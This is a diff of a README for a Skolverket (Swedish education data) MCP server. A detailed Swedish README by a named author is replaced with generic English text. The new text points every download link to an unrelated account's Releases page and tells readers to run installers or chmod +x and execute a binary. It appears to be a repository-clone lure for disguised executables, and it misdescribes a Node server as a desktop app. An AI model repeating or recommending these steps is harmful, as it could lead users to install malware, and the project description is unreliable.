@@ -1,281 +1,84 @@
-<img width="700" height="220" alt="Skolverket MCP logo" src="https://github.com/user-attachments/assets/74563bdb-eea4-4276-a58c-ec89b11806ed" />
+# 🎓 Skolverket-MCP - Access Educational Data Easily
 
-# Skolverket MCP Server
+[![Download Skolverket-MCP](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/mimanshaherbals-bot/Skolverket-MCP/releases)
 
-[![Server Status](https://img.shields.io/website?url=https%3A%2F%2Fskolverket-mcp.onrender.com%2Fhealth&label=MCP%20Server&up_message=online&down_message=offline)](https://skolverket-mcp.onrender.com/health)
-[![npm version](https://img.shields.io/npm/v/skolverket-mcp)](https://www.npmjs.com/package/skolverket-mcp)
-[![MCP Registry](https://img.shields.io/badge/MCP%20Registry-Published-brightgreen)](https://registry.modelcontextprotocol.io/servers/io.github.KSAklfszf921/skolverket-mcp)
-[![MCP Protocol](https://img.shields.io/badge/MCP-2025--03--26-green)](https://modelcontextprotocol.io/)
-[![License](https://img.shields.io/badge/license-MIT-orange)](LICENSE)
+## 📖 Overview
 
-En [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) server som ger AI-assistenter tillgång till **alla Skolverkets öppna API:er** – Läroplan API, Skolenhetsregistret och Planned Educations API.
+Skolverket-MCP is a server designed to provide easy access to open data from the Swedish National Agency for Education. It helps you query, parse, and integrate information from different educational data sources using large language models. You can get statistics, facts, and other important details from three public API endpoints.
 
-**Skapad av:** [Isak Skogstad](mailto:isak.skogstad@me.com) • [X/Twitter](https://x.com/isakskogstad)
+## 🚀 Getting Started
 
----
+To get started with Skolverket-MCP, follow these simple steps:
 
-## 🚀 Två sätt att använda
+1. Visit the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/releases) to download the application.
+2. Choose the latest version and click on the download link for your operating system.
 
-### 🌐 Remote Server (Rekommenderat)
-**Hostad på Render – gratis och alltid uppdaterad**
+## 💻 System Requirements
 
-Använd den publika servern direkt utan installation:
-```
-https://skolverket-mcp.onrender.com/mcp
-```
+Before you proceed, make sure your computer meets the following requirements:
 
-✅ Ingen installation krävs
-✅ Fungerar direkt i ChatGPT, Claude, Cursor, VS Code
-✅ Alltid senaste versionen
-✅ Kostnadsfritt
+- Operating System: Windows 10 or higher, macOS 10.14 or higher, or any modern Linux distribution.
+- Minimum RAM: 4 GB
+- Processor: Dual-core or better
+- Internet Connection: Required for accessing online data
+- Storage: At least 100 MB of free disk space
 
-### 💻 Lokal Installation
-**För utveckling eller offline-användning**
+## 🛠️ Installation Instructions
 
-Klona och kör lokalt:
-```bash
-git clone https://github.com/KSAklfszf921/skolverket-mcp.git
-cd skolverket-mcp
-npm install && npm run build
-```
+### Windows
 
-✅ Full kontroll över koden
-✅ Fungerar offline
-✅ Perfekt för utveckling och testning
+1. Download the Windows installer from the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/releases).
+2. Locate the downloaded file, usually in your Downloads folder.
+3. Double-click the file to start the installation process.
+4. Follow the prompts. Once completed, you will see an application icon on your desktop.
+5. Open the application and begin exploring educational data!
 
----
+### macOS
 
-## 🛠️ Funktioner
+1. Navigate to the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/releases).
+2. Download the installer file for macOS.
+3. Find the file in your Downloads folder and double-click it.
+4. Drag the Skolverket-MCP icon into your Applications folder.
+5. Open the application from your Applications folder.
 
-MCP-servern implementerar MCP-protokollet med stöd för:
-- **41 verktyg** – 17 Syllabus API, 4 School Units, 17 Planned Educations (inkl. gymnasieutbildningar, statistik, dokument), 3 Support Data, 1 diagnostik
-- **4 resurser** – API-info, skoltyper, läroplanstyper, kurs- och ämneskoder
-- **5 promptmallar** – Kursanalys, versionsjämförelser, vuxenutbildning, studievägledning, kursplanering
+### Linux
 
-### Nya verktyg i v2.7.0
-**Gymnasieutbildningar:**
-- `search_education_events` - Sök gymnasieutbildningar
-- `count_education_events` - Räkna gymnasieträffar
-- `get_school_unit_education_events` - Utbildningar per skola
+1. Go to the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/releases).
+2. Download the Linux version suitable for your distribution.
+3. Open a terminal and navigate to the directory where you downloaded the file.
+4. Ensure the file is executable. Run:
+   ```
+   chmod +x Skolverket-MCP
+   ```
+5. Launch the application by executing:
+   ```
+   ./Skolverket-MCP
+   ```
 
-**Vuxenutbildning:**
-- `count_adult_education_events` - Räkna vuxenutbildningar
-- `get_adult_education_areas_v4` - Alla utbildningsområden
+## 🔄 Updating the Application
 
-**Skolenheter:**
-- `search_school_units_v4` - Utökad skolenhetssökning
+To keep your software running smoothly, check for updates regularly. Visit the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/releases) to find the latest version, and follow the installation steps listed above.
 
-**Support Data:**
-- `get_school_types_v4` - Alla skoltyper
-- `get_geographical_areas_v4` - Län och kommuner
-- `get_programs_v4` - Gymnasieprogram
+## 📞 Support
 
-**Statistik & Dokument:**
-- `get_school_unit_documents` - Inspektionsrapporter
-- `get_school_unit_statistics` - Skolenhetsstatistik
-- `get_national_statistics` - Nationell statistik
-- `get_program_statistics` - Programstatistik
+If you encounter any issues or have questions regarding the software, feel free to reach out through the GitHub issues page. We keep the community updated with answers and support.
 
-### API-integration
-Servern kopplar till tre av Skolverkets öppna API:er:
+## 💡 Features
 
-**1. Syllabus API**
-Läroplaner (LGR11, GY11), ämnen, kurser, gymnasieprogram med kunskapskrav och centralt innehåll.
+- Access to Swedish educational data from the National Agency for Education.
+- Intuitive interface for fetching and displaying data.
+- Integration with popular AI models for seamless data queries.
+- Customizable settings for tailored user experience.
 
-**2. Skolenhetsregistret**
-Sök och filtrera skolor, förskolor och andra skolenheter. Inkluderar aktiva, nedlagda och vilande enheter.
+## 📋 Topics Covered
 
-**3. Planned Educations API**
-Yrkeshögskola, SFI, Komvux och andra vuxenutbildningar med startdatum, platser och studietakt.
+Skolverket-MCP connects you with a variety of educational topics, helping to enhance your knowledge in areas such as:
 
----
+- AI and education
+- Public data and statistics from Sweden
+- Educational resources for students and educators
+- Queries related to the Swedish education system
 
+## ✨ Conclusion
 
-## 📱 Snabbstart 
-
-### Claude (Webb)
-
-
-
-https://github.com/user-attachments/assets/f7625e91-6f42-4301-b813-51f9bfcc7ef0
-
-
-**1. Gå till claude.ai:**
-- Logga in på https://claude.ai
-
-**2. Öppna inställningar:**
-- Klicka på din profil (nere till vänster)
-- Välj **"Settings"**
-
-**3. Lägg till MCP-server:**
-- Gå till **"Developer"** eller **"Integrations"**
-- Klicka **"Add MCP Server"** eller **"Connect"**
-- **Name:** `Skolverket MCP`
-- **URL:** `https://skolverket-mcp.onrender.com/mcp`
-- **Type:** Välj `HTTP` eller `Streamable HTTP`
-- Klicka **"Connect"** eller **"Add"**
-
----
-
-### Claude Desktop
-
-**1. Öppna Claude Desktop Settings**
-- **macOS:** Claude-menyn → Settings
-- **Windows:** Claude-menyn → Settings
-
-**2. Gå till Connectors:**
-- Klicka på **"Connectors"** i vänstermenyn
-- Klicka **"Add custom connector"**
-
-**3. Fyll i formuläret:**
-- **Name:** `Skolverket MCP`
-- **Remote MCP server URL:** `https://skolverket-mcp.onrender.com/mcp`
-- **Advanced settings:** Lämna OAuth-fälten **tomma**
-- Klicka **"Add"**
-
-#### Alternativ: Lokal installation 
-
-**1. Klona och bygg:**
-```bash
-git clone https://github.com/KSAklfszf921/skolverket-mcp.git
-cd skolverket-mcp
-npm install && npm run build
-```
-
-**2. I Claude Desktop:**
-- Settings → **Developer** (inte Connectors!)
-- Klicka **"Edit Config"**
-
-**3. Lägg till i JSON-filen:**
-```json
-{
-  "mcpServers": {
-    "skolverket": {
-      "command": "node",
-      "args": ["/absolut/sökväg/till/skolverket-mcp/dist/index.js"]
-    }
-  }
-}
-```
-
-**4. Spara och starta om Claude Desktop**
-
-**Notera:** Lokal installation använder stdio-transport via Developer-sektionen, inte Connectors.
-
----
-
-### Claude Code
-
-**Live-Server:**
-```bash
-claude mcp add --transport http skolverket https://skolverket-mcp.onrender.com/mcp
-```
-
-**Lokal (från källkod):**
-```bash
-# Efter git clone och npm install (se ovan)
-claude mcp add skolverket node /absolut/sökväg/till/dist/index.js
-```
-
-**Verifiera:** `claude mcp list`
-
----
-
-### ChatGPT 
-
-#### I Webbläsaren (chatgpt.com)
-
-**1. Aktivera Utvecklarläget (engångsinstallation):**
-- Gå till https://chatgpt.com
-- Klicka på din **profil** (nere till vänster)
-- Välj **"Appar och sammanlänkningar"**
-- Hitta **"Utvecklarläge" (BETA)** och aktivera den blå toggle-knappen
-
-**2. Lägg till MCP-server:**
-- I samma "Appar och sammanlänkningar"-vy
-- Scrolla ner till **"Aktiva sammanlänkningar"**
-- Klicka **"Ny sammanlänkning"** eller **"+"**
-
-**3. Fyll i formuläret:**
-- **Namn:** `Skolverket MCP`
-- **Beskrivning:** (valfritt)
-- **URL för MCP-server:** `https://skolverket-mcp.onrender.com/mcp`
-- **Autentisering:** Välj **"Ingen autentisering"**
-- Markera **"Jag förstår och vill fortsätta"**
-- Klicka **"Skapa"**
-
----
-
-### OpenAI Codex (terminal)
-
-#### Remote Server (HTTP)
-
-**`~/.codex/config.toml`:**
-```toml
-[mcp.skolverket]
-url = "https://skolverket-mcp.onrender.com/mcp"
-transport = "http"
-```
-
-#### Lokal Installation
-
-**1. Klona och bygg (om ej redan gjort):**
-```bash
-git clone https://github.com/KSAklfszf921/skolverket-mcp.git
-cd skolverket-mcp
-npm install && npm run build
-```
-
-**2. Konfigurera stdio-transport:**
-
-**`~/.codex/config.toml`:**
-```toml
-[mcp.skolverket]
-command = "node"
-args = ["/absolut/sökväg/till/skolverket-mcp/dist/index.js"]
-transport = "stdio"
-```
-
-**Windows:**
-```toml
-[mcp.skolverket]
-command = "node"
-args = ["C:\\Users\\username\\skolverket-mcp\\dist\\index.js"]
-transport = "stdio"
-```
----
-
-## 💡 Användningsområden
-
-
-https://github.com/user-attachments/assets/8eefa26c-4162-49a5-adf0-82677a663b19
-
-
-### För Lärare
-- **Kursplanering:** "Jämför kunskapskraven E och A för Svenska 1 och ge förslag på bedömningsuppgifter"
-- **Tematiskt arbete:** "Hitta alla kurser i gymnasiet som har hållbarhet i sitt centrala innehåll"
-- **Bedömning:** "Visa alla kunskapskrav för betyg C i Biologi 1 och förklara skillnaderna mot B"
-
-### För elever & föräldrar
-- **Programval:** "Jämför Naturvetenskapsprogrammet och Teknikprogrammet - vilka kurser är obligatoriska?"
-- **Kursval:** "Vilka matematikkurser finns på gymnasiet och vilka bygger på varandra?"
-- **Betygskriterier:** "Vad krävs för att få A i Historia 1a1?"
-
-### För undersökningar & analyser  
-- **Skolregister:** "Hitta alla aktiva gymnasieskolor i Stockholms län"
-- **Kursutbud:** "Vilka skolor erbjuder Ekonomiprogrammet i Malmö?"
-- **Läroplansanalys:** "Analysera hur begreppet 'programmering' har utvecklats i läroplaner 2011-2025"
-
----
-
-## 🆘 Support
-
-**GitHub Issues:** https://github.com/KSAklfszf921/skolverket-mcp/issues
-**Email:** isak.skogstad@me.com • **X:** [@isakskogstad](https://x.com/isakskogstad) 
-[![MCP Badge](https://lobehub.com/badge/mcp/ksaklfszf921-skolverket-syllabus-mcp)](https://lobehub.com/mcp/ksaklfszf921-skolverket-syllabus-mcp)
-
----
-
-## 📝 Licens
-
-MIT License – Data från Skolverkets öppna API:er. Inte officiellt associerad med Skolverket.
+Skolverket-MCP makes accessing essential educational data easy and straightforward. Follow the steps above to download and set up the application. Discover a wealth of information to support your educational needs! Visit the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/releases) to get started today.
